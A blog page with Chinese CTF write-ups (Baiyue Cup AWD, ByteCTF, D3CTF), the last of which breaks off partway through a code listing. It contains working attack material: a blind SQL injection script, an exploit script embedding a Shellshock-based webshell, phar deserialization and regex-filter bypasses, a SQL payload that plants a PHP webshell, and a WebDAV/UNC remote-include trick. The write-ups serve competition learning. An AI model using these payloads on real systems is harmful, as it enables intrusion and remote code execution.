<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;page&#x2F;2&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:51:15.389Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
<p><code>grep &quot;/flag &quot; */*</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
<p>php的web主要也就这两的洞</p>
<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
<p>但是在index.php中：</p>
<pre><code class="php">&lt;?php
if (isset($_GET[&#39;page&#39;])){
    $page = $_GET[&#39;page&#39;];

}else{
        $page = &#39;chart.php&#39;;
}
?&gt;
&lt;?php
    include_once &quot;$page&quot;;
?&gt;</code></pre>
<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><pre><code class="php">    &lt;?php
    if (isset($_POST[&#39;name&#39;])){
        $name = $_POST[&#39;name&#39;];
        exec(&quot;tar -cf backup/$name images/*.jpg&quot;);
        echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;
                导出成功,&lt;a href=&#39;backup/$name&#39;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;;
    }
    ?&gt;</code></pre>
<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </code></pre><p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
<pre><code>exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);
rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</code></pre><h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/byb2019线下awd/">http://blog.ccreater.top/2020/04/20/byb2019线下awd/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="cka3ckr2i001hv4v0fkwh2ek6" data-title="百越杯总结" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/bytectfwp/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:50:44.547Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/bytectfwp/">bytectf wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
<pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){
        $title = addslashes($_POST[&#39;title&#39;]);
        $content = addslashes($_POST[&#39;content&#39;]);
        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);
    }</code></pre>
<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
<p>sql盲注判断脚本:</p>
<pre><code class="python">import requests
from bs4 import BeautifulSoup
anti_disturb_key=&#39;cjb_ccreater_s_test&#39;
PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;
check_article_id=20
def check(check_title):
    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)
    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]
    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text
    if title[:len(anti_disturb_key)]!=anti_disturb_key :
        return &#39;disturb&#39;
    elif content!=&#39;success&#39;+check_title:
        return &#39;false&#39;
    else :
        return &#39;success&#39;



def make_write(title,info):
    data={
        &#39;title&#39;:title,
        &#39;content&#39;:info
    }
    url=&#39;http://112.125.24.134:9999/writing.php&#39;
    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    if res.status_code==200:
        return True
    else :
        return False

def get_newest_id():
    url=&#39;http://112.125.24.134:9999/index.php&#39;
    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]
    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]
    return int(newest_id)

def sql_inject(sql):
    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;
    info=&#39;success&#39;+title
    if make_write(title,info):
        #编辑id=newest_id的文章来读取$raw[&#39;title&#39;]
        newest_id=get_newest_id()
        url=&#39;http://112.125.24.134:9999/edit.php&#39;
        data={
            &#39;title&#39;:title,
            &#39;content&#39;:info,
            &#39;id&#39;:newest_id
        }
        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)
        #判断盲注结果
        result=check(title)
        if result==&#39;success&#39;:
            return True
        elif result==&#39;disturb&#39;:
            print(&quot;受到干扰,重新执行&quot;)
            return sql_inject(sql)
        else :
            return False
    else :
        print(&#39;程序执行错误,请保持结果&#39;)
        eval(input(&#39;执行命令:&#39;))

#demo 
#sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;
sql=&#39;&#39;&#39;
(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess 
&#39;&#39;&#39;
### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67
#猜information_schema表名
#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b
result=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;

index=len(result)
while 1:
    index+=1
    temp=sql.replace(&#39;index&#39;,str(index))
    for i in range(20):
        print(&quot;猜测第&quot;+str(index)+&quot;位为:&quot;+str(i))
        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):
            result+=hex(i)[2:]
            break
    print(result)
    res=&#39;&#39;
    for i in range(0,len(result),2):
        res+=chr(int(result[i:i+2],16))
    print(res)

</code></pre>
<p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>绕过正则过滤</p>
<p>拿到vip账号:wulax,密码:1,网址:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p>
<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
<p>命令执行利用脚本:</p>
<pre><code class="python">import requests

url=&quot;http://112.126.101.16:9999&quot;
arc_id=&quot;11&quot;
session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;
text=&#39;&#39;&#39;
&lt;?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
   $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;; 
    $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;
    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;; 

   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != &quot;&quot;) return $output; 
   else return &quot;No output, or not vuln.&quot;; 
} 
echo shellshock($_REQUEST[&quot;cmd&quot;]); 
?&gt;
&#39;&#39;&#39;
def edit():
    data={
        &quot;title&quot;:&quot;bbb&quot;,
        &quot;content&quot;:&quot;b&quot;,
        &quot;id&quot;:arc_id
    }
    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
def exec(s):
    data={
        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,
        &quot;regex&quot;:&quot;1&quot;,
        &quot;id&quot;:arc_id,
        &quot;find&quot;:&quot;b/e\x00&quot;,
        &quot;cmd&quot;:&quot;ls -al&quot;,
        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;
    }
    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
    edit()
    return result
while 1:
    print(exec(input()).text)</code></pre>
<p>emmmm..到这里就不会做了.到头了.</p>
<p>后来发现有个antsystem()</p>
<p>vardump(antsystem(‘/readfile’));</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
<p>代码审计发现</p>
<p>在config.php下</p>
<pre><code class="php">class File{
    public $filename;
    public $filepath;
    public $checker;
    function __construct($filename, $filepath)
    {
        $this-&gt;filepath = $filepath;
        $this-&gt;filename = $filename;
    }
    function __destruct()
    {
        if (isset($this-&gt;checker)){
            $this-&gt;checker-&gt;upload_file();
        }
    }
    public function view_detail(){

        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){
            die(&quot;nonono~&quot;);
        }
        $mine = mime_content_type($this-&gt;filepath);
        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);
        $res[&#39;mine&#39;] = $mine;
        $res[&#39;store_path&#39;] = $store_path;
        return $res;

    }
}</code></pre>
<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
<p>最后在view.php处找到调用view_detail的地方</p>
<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
<p>所以我们可以可以试着删除它</p>
<p>构造pop链:</p>
<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
<p>我觉得这才是这一题最骚的地方:</p>
<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
<p>然后手动pk :D</p>
<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/bytectfwp/">http://blog.ccreater.top/2020/04/20/bytectfwp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/bytectfwp/" data-id="cka3ckr2h001ev4v0hxa703sn" data-title="bytectf wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-d3ctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/d3ctf2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:50:22.197Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/d3ctf2019/">d3ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h1><p>疯狂涨姿势，就很nice</p>
<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p> <a href="https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md" target="_blank" rel="noopener">https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md</a> </p>
<p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a> </p>
<p> <a href="https://www.anquanke.com/post/id/193939#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193939#h3-4</a> </p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg" alt="image.png"></p>
<p>和username有关?</p>
<p>x  注册一个用户名为:<code>*/echo 1231231231;/*</code>的用户</p>
<p>二次注入,User 的index方法调用get_view</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg" alt="image.png"></p>
<p>利用替换{来绕过select 和 union的过滤,利用0x….来绕过{的过滤</p>
<p>最后的payload</p>
<p>注册一个用户名为<code>aaa&#39; unio{n selec}t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#</code>成功拿到shell权限</p>
<p> d3ctf{Th4at’s_A_Si11y_P0p_chi4n} </p>
<h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p>报错</p>
<pre><code>
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(): Failed opening &#39;http://39.108.164.219:60005/1.txt&#39; for inclusion (include_path=&#39;.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;&#39;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</code></pre><p>虽然禁用了http协议,但是还是会发送请求</p>
<p>unc路径远程文件包含</p>
<p>一键启动一个webdav服务器</p>
<p><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code>然后把php文件放到/root/webdav/data里就行了</p>
<p><a href="http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf" target="_blank" rel="noopener">http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf</a></p>
<p>eval($_COOKIE[‘a’]);</p>
<p>whois</p>
<pre><code>Domain Name: D3CTF.IO
Registry Domain ID: D503300001132938421-LRMS
Registrar WHOIS Server: whois.namesilo.com
Registrar URL: http://www.namesilo.com
Updated Date: 2019-10-14T20:31:26Z
Creation Date: 2019-08-15T11:56:00Z
Registry Expiry Date: 2020-08-15T11:56:00Z
Registrar Registration Expiration Date:
Registrar: Namesilo, LLC
Registrar IANA ID: 1479
Registrar Abuse Contact Email: 
Registrar Abuse Contact Phone: +1.4805240066
Reseller:
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Organization: See PrivacyGuardian.org
Registrant State/Province: AZ
Registrant Country: US
Name Server: DNS21.HICHINA.COM
Name Server: DNS22.HICHINA.COM
DNSSEC: unsigned

The Registrar of Record identified in this output may have an RDDS service that can be queried 
for additional information on how to contact the Registrant, Admin, or Tech contact of the 
queried domain name.</code></pre><pre><code>本站数据：香港特别行政区 腾讯云
参考数据1：香港 tencent.com
参考数据2：美国
兼容IPv6地址：::966D:4AEA
映射IPv6地址：::FFFF:966D:4AEA</code></pre><p>whoami</p>
<pre><code>whoami /all

USER INFORMATION
----------------

User Name        SID                                         
================ ============================================
172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    

</code></pre><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><pre><code class="php">&lt;?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this-&gt;userdir = &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;]);
        $this-&gt;url = $url;
        $this-&gt;filename  =  $filename;
        if (!file_exists($this-&gt;userdir)) {
            mkdir($this-&gt;userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this-&gt;userdir != &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;])) {
            die(&#39;hacker!!!&#39;);
        }
    }
    public function checkurl(){
        $r = parse_url($this-&gt;url);
        if (!isset($r[&#39;scheme&#39;]) || preg_match(&quot;/file|php/i&quot;,$r[&#39;scheme&#39;])){
            die(&#39;hacker!!!&#39;);
        }
    }
    public function checkext(){
        if (stristr($this-&gt;filename,&#39;..&#39;)){
            die(&#39;hacker!!!&#39;);
        }
        if (stristr($this-&gt;filename,&#39;/&#39;)){
            die(&#39;hacker!!!&#39;);
        }
        $ext = substr($this-&gt;filename, strrpos($this-&gt;filename, &quot;.&quot;) + 1);
        if (preg_match(&quot;/ph/i&quot;, $ext)){
            die(&#39;hacker!!!&#39;);
        }
    }
    public function upload(){
        $this-&gt;checkdir();
        $this-&gt;checkurl();
        $this-&gt;checkext();
